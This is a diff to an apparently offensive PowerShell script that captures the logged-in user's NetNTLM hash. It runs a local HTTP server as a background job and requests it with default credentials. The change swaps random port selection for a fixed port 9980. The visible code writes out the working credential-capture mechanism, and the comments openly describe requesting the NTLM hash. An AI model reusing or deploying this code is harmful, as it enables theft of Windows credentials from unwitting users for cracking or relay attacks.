@@ -154,21 +154,13 @@ $NetNTLM_ScriptBlock = {
     # Find available port
     $random = New-Object System.Random   
     $takenPorts = Get-NetTCPConnection -LocalAddress 127.0.0.1
-    $port = 0  
-    while (!$port) {
-        $port = $random.Next(1025,65535)
-        foreach ($takenPort in $takenPorts) {
-            if ($port -eq $takenPort.Localport) {
-                $port = 0
-            }
-            
-        }
-    }    
+    $port = 9980
+ 
     # Start local http server in background
     $job = Start-Job -ScriptBlock $NetNTLM_ScriptBlock -ArgumentList $port
     
     # Request the NTLM hash from local http server
-    Invoke-WebRequest -uri http://localhost:$port -UseDefaultCredentials | Write-Host  
+    Invoke-WebRequest -uri http://localhost:9980 -UseDefaultCredentials | Write-Host  
 
     # Cleanup
     Stop-Job -Job $job
